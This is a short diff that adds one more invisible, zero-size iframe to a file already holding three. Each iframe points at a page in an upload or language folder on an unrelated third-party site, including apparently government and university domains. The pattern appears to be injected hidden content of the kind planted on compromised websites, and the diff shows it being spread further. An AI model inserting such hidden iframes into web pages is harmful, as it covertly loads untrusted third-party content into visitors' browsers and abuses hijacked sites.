@@ -1,3 +1,4 @@
+<iframe src="https://asahankab.go.id/home/wp-content/languages/id_ID.mo.html" width="0%" height="0"></iframe>
 <iframe src="https://www.terabytes.com.ng/uploads/source/source/profile/profile.html" width="0%" height="0"></iframe>
 <iframe src="http://isphe.unnes.ac.id/laravel-filemanager/uploads/profile/profile.html" width="0%" height="0"></iframe>
 <iframe src="https://devicesmaintenance.com/uploads/profile/profile.html" width="0%" height="0"></iframe>
